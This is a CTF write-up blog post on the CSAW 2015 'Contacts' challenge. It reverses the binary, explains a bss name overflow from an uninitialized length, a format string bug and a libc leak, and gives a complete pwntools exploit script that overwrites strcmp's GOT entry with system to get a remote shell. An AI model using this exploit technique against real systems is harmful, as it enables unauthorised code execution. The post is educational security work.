---
author: breadchris
comments: true
layout: post
date:       2015-09-28 12:00+00:00
slug: csaw-ctf-contacts
title:      CSAW CTF 2015 - Contacts
---

### TL; DR
* Overflow
* Uninitialized Variable
* Format String

CSAW CTF was a lot of fun this year (mostly because I was actually able to solve challenges ;D) and solving Contacts was pretty satisfying.

Let's start by getting an idea what is up with it:

```bash
vagrant@precise64:~/csawctf$ file contacts
contacts: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x9736c7a26b5c55f97874c5e62d359e02c88cf2f1, stripped
```

Alright, and the security mitigations it has:

```bash
vagrant@precise64:~/csawctf$ ~/Template/checksec.sh --file contacts
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   contacts
```

Great, so it doesn't look like we are bouta drop some shellcode or overflow some stack based buffer anytime soon (we could in certain situations find the stack canary either with a leak or [brute force](http://hmarco.org/data/Preventing_brute_force_attacks_against_stack_canary_protection_on_networking_servers.pdf)).

So if we play around with this a bit, we get an idea as to what is going on:

```bash
vagrant@precise64:~/csawctf$ ./contacts
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
```

So we can create, remove, edit and display contacts. There are some things that we could look at first, the path that I first chose was looking at was the fact that you could specify how long your description was in your contact (this is a pretty common vuln in ctf problems).

```bash
>>> 1
Contact info:
    Name: Poopy
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 1231231234
    Length of description: 50
    Enter description:
        asdf
```

So if we look at the first place we can supply our description, it is a pretty clear that we will not be overflowing anything anytime soon as the program allocates based on the size we provide:

```nasm
.text:0804884E                 mov     [esp+4], eax                ; Destination of our size
.text:08048852                 mov     dword ptr [esp], offset aUC ; "%u%*c"
.text:08048859                 call    ___isoc99_scanf
.text:0804885E                 mov     edx, [ebp+var_C]
.text:08048861                 mov     eax, [ebp+arg_0]
.text:08048864                 mov     [eax+48h], edx
.text:08048867                 mov     eax, [ebp+var_C]
.text:0804886A                 add     eax, 1
.text:0804886D                 mov     [esp], eax      ; size
.text:08048870                 call    _malloc
```

and then reads into the allocated space the number of bytes we specify:

```nasm
.text:0804889D                 mov     ecx, ds:stdin
.text:080488A3                 mov     eax, [ebp+var_C] ; Our size
.text:080488A6                 add     eax, 1
.text:080488A9                 mov     edx, eax
.text:080488AB                 mov     eax, [ebp+arg_0]
.text:080488AE                 mov     eax, [eax]
.text:080488B0                 mov     [esp+8], ecx    ; stream
.text:080488B4                 mov     [esp+4], edx    ; n
.text:080488B8                 mov     [esp], eax      ; s
.text:080488BB                 call    _fgets
```

But what about when we edit our contact? Well it turns out that that the description is allocated and read in the same way as when we create the contact :C

When trying to solve a challenge with so many places to input data, it doesn't hurt to make a guess as to a potential vulnerability even if it turns out to be a dead end, especially when you are pressed for time.

Let's now checkout that innocent looking name input (really just going through all potential inputs at this point):

```nasm
.text:080487D3 get_name        proc near               ; CODE XREF: add_contact+3Fp
.text:080487D3
.text:080487D3 arg_0           = dword ptr  8
...
.text:080487E5                 mov     eax, ds:stdin
.text:080487EA                 mov     edx, [ebp+arg_0]
.text:080487ED                 add     edx, 8
.text:080487F0                 mov     [esp+8], eax    ; stream
.text:080487F4                 mov     dword ptr [esp+4], 64 ; n
.text:080487FC                 mov     [esp], edx      ; s
.text:080487FF                 call    _fgets
```

Hmmm... what is arg_0 in `add_contact` (this was a stripped binary so these are names that I gave each function):

```nasm
.text:08048B5E add_contact     proc near               ; CODE XREF: main+B6p
.text:08048B5E
.text:08048B5E var_10          = dword ptr -10h
.text:08048B5E var_C           = dword ptr -0Ch
.text:08048B5E arg_0           = dword ptr  8
...
.text:08048B64                 mov     eax, [ebp+arg_0]
.text:08048B67                 mov     [ebp+var_10], eax
...
.text:08048B97                 mov     eax, [ebp+var_10]
.text:08048B9A                 mov     [esp], eax
.text:08048B9D                 call    get_name
```

What does main pass `add_contact` as a parameter then?

```nasm
.text:0804876C                 mov     dword ptr [esp], offset unk_804B0A0 ; jumptable 0804876A case 1
.text:08048773                 call    add_contact
```

...where the fuck is `unk_804B0A0`?

```nasm
.bss:0804B0A0 unk_804B0A0     db    ? ;               ; DATA XREF: main:loc_804876Co
.bss:0804B0A0                                         ; main:loc_804877Ao ...
.bss:0804B0A1                 db    ? ;
.bss:0804B0A2                 db    ? ;
```

Oh! So we read the name into the bss segment. If we do a little more reversing of the `add_contact` function, we realize that each contact is stored in the bss segment in a struct that resembles:

```c
struct contact {
    char *desc;          // Heap pointer
    char *phone;         // Heap pointer
    char name[64];
    int description_len;
    int is_person;       // Used in print_contacts
}

Total bytes for a contact = 2 * sizeof(char *) + 2 * sizeof(int) + 64 * sizeof(char) = 80 bytes
```

So as we add more contacts, we are adding to the contacts list located in the bss segment. So if we make 3 contacts, `0x0804B0A0` will look like:

```nasm
0x0804B0A0+0x0      Contact 1
0x0804B0A0+0x80     Contact 2
0x0804B0A0+0x100    Contact 3
```

So when we initally create our contact, it reads the correct amount into our name buffer:

```nasm
.text:080487F4                 mov     dword ptr [esp+4], 64 ; n
```

But what about when we change our name...

```nasm
.text:08048A4E                 mov     edx, ds:stdin
.text:08048A54                 mov     eax, [ebp+n]
.text:08048A57                 mov     ecx, [ebp+var_54]
.text:08048A5A                 add     ecx, 8
.text:08048A5D                 mov     [esp+8], edx    ; stream
.text:08048A61                 mov     [esp+4], eax    ; n
.text:08048A65                 mov     [esp], ecx      ; s
.text:08048A68                 call    _fgets
```

Hmmm, that is a little strange. What is that `[ebp+n]` set to? If you look at all the times `[ebp+n]` is referenced in `edit_contact` you will find that it is only ever accessed and never assigned!

![uninitialized variable](https://i.imgur.com/YurOMQq.png)

That means that `[ebp+n]` is an uninitialized variable, meaning that whatever value that was left on the stack from a previous function call would be used as the value for `[ebp+n]`. I did not bother to really check what value would exactly be there, but if you shove a bunch of As in, you find out quickly that it is definetly a number bigger than 64:

```bash
Name to change? Dolan
1.Change name
2.Change description
>>> 1
New name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
    Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Length 1094795585
    Phone #: 8675309
    Description: Drop it like it's hot
    Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Length 1337
Segmentation fault
```

Now what is important to realize is that you have to make a second contact because the crash is a result of you overflowing the name buffer of the first person all the way into a pointer of the second person. And when you go to print out the second person, the program doesn't have access to the memory at `0x41414141`:

```bash
Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  ESI: 0xFFFFCF88  EDI: 0x41414141
--------------------------------------------------------------------------[code]
=> 0xf7e64a6a <vfprintf+9098>:    repnz scas al,BYTE PTR es:[edi] ; Can't dereference edi, because edi = 0x41414141
--------------------------------------------------------------------------------
0xf7e64a6a in vfprintf () from /lib/i386-linux-gnu/libc.so.6
gdb$
```

So in our contacts list at the point of the crash, it would look something like:

```c
contact 1:
    char *desc          = some pointer;
    char *phone         = some pointer;
    char name[64]       = AAAAAAAAAAAAA... (repeats 64 times)
    int description_len = AAAA
    int is_person       = AAAA
contact 2:
    char *desc          = AAAA <-- Not a valid pointer (will crash if you try to access it)
    char *phone         = AAAA <-- Not a valid pointer
    char name[64]       = AAAAAAAAAAAAA... (repeats 64 times)
    int description_len = AAAA
    int is_person       = AAAA
```

If we take a quick look at `print_contact` we see something interesting...

```nasm
.text:08048BD7                 mov     eax, [ebp+arg_0]
.text:08048BDA                 mov     [esp+4], eax
.text:08048BDE                 mov     dword ptr [esp], offset aNameS ; "\tName: %s\n"
.text:08048BE5                 call    _printf
.text:08048BEA                 mov     eax, [ebp+arg_4]
.text:08048BED                 mov     [esp+4], eax
.text:08048BF1                 mov     dword ptr [esp], offset aLengthU ; "\tLength %u\n"
.text:08048BF8                 call    _printf
.text:08048BFD                 mov     eax, [ebp+arg_8]
.text:08048C00                 mov     [esp+4], eax
.text:08048C04                 mov     dword ptr [esp], offset aPhoneS ; "\tPhone #: %s\n"
.text:08048C0B                 call    _printf
.text:08048C10                 mov     dword ptr [esp], offset aDescription_0 ; "\tDescription: "
.text:08048C17                 call    _printf
.text:08048C1C                 mov     eax, [ebp+format]
.text:08048C1F                 mov     [esp], eax      ; format
.text:08048C22                 call    _printf
```

A format string vulnerability at `.text:08048C22`! Cool, and if we look at the code, it looks like the description is the culprit.

So now the question is, how do we put this all together? Well for starters, we don't have any calls to `system` or `execve` which would give us a shell on the system so that means we would need either a libc leak (by reading from a GOT pointer) or guessing the libc that the challenge is using. During the competition we exfiltrated the libc binary from the challenge, precision (for a 32 bit libc it is located here `/lib/i386-linux-gnu/libc.so.6`). And dropping this libc in IDA we can find out where `system` is relative to whatever we decide to leak.

But we are still left with the problem of leaking some sort of address located in libc that we can apply some offset to to find the address of libc.

Well we do have a write primitive with our format string so let's see if that gives us anything interesting...

```bash
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 1
Contact info:
    Name: A
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: A
    Length of description: 100
    Enter description:
        %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
>>> 4
Contacts:
    Name: A
    Length 100
    Phone #: A
    Description: 8f3a008.f7614971.f776cff4.0.0.fffc5b08.8048c99.804b0a8.64.8f3a008.8f3a018
```

The second address looks pretty interesting, I wonder what it resolves to:

```nasm
gdb$ x/5i f7e6c971
   0xf7e6c971 <_IO_vfscanf+17>:    add    ebx,0x158683
   0xf7e6c977 <_IO_vfscanf+23>: sub    esp,0x22c
   0xf7e6c97d <_IO_vfscanf+29>: mov    esi,DWORD PTR [ebp+0x8]
   0xf7e6c980 <_IO_vfscanf+32>: mov    DWORD PTR [ebp-0x1b0],eax
   0xf7e6c986 <_IO_vfscanf+38>: mov    edi,DWORD PTR [ebp+0xc]
```

Too easy. So we can find the offset between `_IO_vfscanf+17` and `system` (actually making this writeup I realized that I fucked up the offset, I found the offset from `_IO_vfscanf` to `system` forgetting to subtract 17 from the offset :c. I got really frusted that it wasn't working so I bruteforced the offset and after 17 iterations it worked lol :3).

Also to cover all components of the exploit, the first address that we read off the stack in the format string `0x8f3a008` is actually the address of our phone number pointer which we know to be a heap address. Based on this address, we can actually determine where all other allocations will be made (by using a debugger and finding where things are allocated relative to our first phone number allocation).

What is interesting is that with our name overflow, we can actually overflow the phone number pointer and cause it to become any pointer that we want. For example, it could be the GOT address of `strcmp` for example ;D

If we look at `edit_contact`, we see that it is using `strcmp` to compare our inputed name to the names that it knows of:

```nasm
.text:08048A04                 mov     [esp+4], eax    ; s2
.text:08048A08                 lea     eax, [ebp+s]
.text:08048A0B                 mov     [esp], eax      ; s1
.text:08048A0E                 call    _strcmp
```

So this code will turn from:

```c
strcmp(our_stuff, name);
```

to

```c
system(our_stuff)
```

With the phone number pointer being on the stack at the time of our format string vuln, we can have an arbiturary write to anywhere in the program by just changing the phone number pointer in our overflow :3

So our approach now becomes:

1. Create the first person
2. Set their name and phone number to be anything
3. Set their description to be "%x.%x"
4. Print out the contact
5. Using the leaked phone number allocation and leaked `_IO_vprintf` address calculate all the addresses we need to have
6. Create a second person
7. Set their name and number to be anything
8. Set their description to be a format string payload to overwrite the lower part of the `strcmp` GOT address with the lower part of our `system` address
9. Change the first person's name to overflow into the phone number, changing it to be the `strcmp` GOT address making sure to keep the second person's description pointer intact (since we will be overflowing it too, and we need to the pointer to keep pointing to our format string payload)
10. Create a third person
11. Set their name and number to be anything
12. Set their description to be a format string payload to overwrite the upper part of the `strcmp` GOT address with the upper part of our `system` address
13. Change the second person's name to overflow into the phone number, changing it to be the `strcmp` GOT address making sure to keep the third person's description pointer intact
14. Print out the contacts, overwriting the `strcmp` GOT with our `system` address
15. Edit the contact named "/bin/sh"
16. Get shell <3

Here is the exploit script ([pwntools is <3](http://pwntools.readthedocs.org)):

```python
from pwn import *

# context.log_level = 'debug'

elf = ELF("contacts")
strcmp_got = elf.got["strcmp"]

def format_string(write_address):
    part1 = write_address & 0xffff
    part2 = (write_address & 0xffff0000) >> 16
    '''
    if part1 > part2:
        tmp = part1
        part1 = part2
        part2 = tmp
    '''
    format_str1 = "%{0}x%1$hn".format(part1)
    format_str2 = "%{0}x%1$hn".format(part2)
    return format_str1, format_str2

def create_contact(r, name, phone, desc):
    r.sendline(str(1))
    r.sendline(name)
    r.sendline(phone)
    r.sendline(str(len(desc)))
    r.sendline(desc)
    r.recvuntil("Menu:")

def edit_contact(r, person, num, change):
    r.sendline(str(3))
    r.sendline(person)
    r.sendline(str(num))
    r.sendline(change)
    r.recvuntil("Menu:")

def display_contacts(r):
    r.sendline(str(4))
    return r.recvuntil("Menu:")

def do_sploit(offset):
    r = remote("54.165.223.128", 2555)
    r.recvuntil(">>>")

    p1 = "AAAA"
    p2 = "BBBB"
    p3 = "CCCC"

    # Create person 1
    create_contact(r, p1, "/bin/sh", "%x.%x")

    leak = display_contacts(r)
    found = leak.index("Description: ") + len("Description: ")
    bin_sh, vfscanf_libc = map(lambda x: int(x, 16), leak[found:found+16].split("."))
    vfscanf_libc -= 17

    print "[+] /bin/sh is @ ", hex(bin_sh), ": [+] _io_vfscanf libc is @ ", hex(vfscanf_libc)

    system_libc = vfscanf_libc + offset
    format1, format2 = format_string(system_libc)

    print "[+] system libc is @ ", hex(system_libc)

    sec_person_desc = bin_sh + 0x30
    print "[+] Second person's description @ ", hex(sec_person_desc)

    trd_person_desc = bin_sh + 0x58
    print "[+] Third person's description @ ", hex(trd_person_desc)

    # Create person 2
    create_contact(r, p2, "1234", format1)

    # Overflow person 1 name into person 2 phone pointer
    payload = "\x69" * (64 + 4 + 4) + p32(sec_person_desc) + p32(strcmp_got) + p2
    edit_contact(r, p1, 1, payload)

    # Create person 3
    create_contact(r, p3, "5678", format2)

    # Overflow person 2 name into person 3 desc pointer
    payload = "\x42" * (64 + 4 + 4) + p32(trd_person_desc) + p32(strcmp_got + 2)
    edit_contact(r, p2, 1, payload)

    # Display
    # Triggers format string vuln to overwrite strcmp with system (when printing person 2)
    # Calls system by having desc pointer overwritten in person 3's desc
    try:
        display_contacts(r)
    except:
        r.close()
        return

    r.sendline("3")
    print r.recv()
    r.sendline("/bin/sh")
    print r.recv()
    try:
        r.sendline("ls")
        print r.recv()
        r.interactive()
    except:
        r.close()
        return

libc_so_6_off = -0xd060
for i in range(0xfff):
    do_sploit(libc_so_6_off - i)
```
